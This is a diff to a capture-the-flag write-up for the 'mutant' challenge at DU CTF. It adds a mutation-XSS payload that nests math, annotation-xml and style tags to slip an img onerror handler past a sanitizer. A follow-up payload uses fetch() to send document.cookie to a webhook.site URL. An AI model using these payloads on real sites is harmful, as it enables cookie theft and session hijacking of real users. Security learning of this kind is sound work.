@@ -112,10 +112,20 @@ Then i tried to construct a valid payload and got a working on :
 
 <img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/mutant/images/3.PNG?raw=true'>
 <br />
+
 ```
 <math><annotation-xml encoding="text/html"><style><img src onerror=alert(origin)>
 ```
 
+***Let's get the flag***
 
+```
+<math><annotation-xml encoding="text/html"><style><img src onerror=fetch('https://webhook.site/62cfc181-7e74-4ff1-9674-039cbc4fc143?x='+document.cookie)>
+```
+
+<br />
+
+<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/mutant/images/5.PNG?raw=true'>
+<br />
 
 
